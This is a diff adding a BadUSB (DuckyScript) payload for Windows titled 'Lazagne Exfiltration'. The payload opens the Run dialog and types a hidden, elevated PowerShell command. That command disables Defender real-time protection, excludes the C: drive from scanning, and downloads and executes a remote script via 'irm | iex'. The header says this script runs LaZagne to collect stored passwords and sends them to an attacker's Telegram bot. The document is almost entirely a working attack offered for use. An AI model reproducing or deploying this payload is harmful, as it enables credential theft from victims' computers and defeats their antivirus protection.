@@ -1,0 +1,24 @@
+REM Title: Lazagne Exfiltration
+REM Author:	mrproxy
+REM Requirements: Telegram bot, Internet Connection
+REM Description: Downloads lazagne, runs lazagne, stores all info to .txt file, sends file to telegram bot.
+REM Target:	Windows
+REM Version:	1.0
+REM Category:	Exfiltration
+REM Source: https://github.com/Mr-Proxy-source/BadUSB-Payloads
+
+REM Remember you will have to host the powershell script yourself on any file sharing service (it has to be direct download link)
+REM If you are using DropBox, just remember to change it from ?dl=0 top ?dl=1
+DEFINE #SCRIPT_URL example.com/payload.ps1?dl=1
+
+REM Here you will have to put your telegram bot details
+DEFINE #BOT_TOKEN your-bot-token
+DEFINE #CHAT_ID your-chat-id
+
+DELAY 1500
+GUI r
+DELAY 500
+STRING powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\'; Start-Sleep -Seconds 5; powershell -w h -NoP -Ep Bypass -Command '$bt='#BOT_TOKEN'; $ci='#CHAT_ID'; irm #SCRIPT_URL | iex'"
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
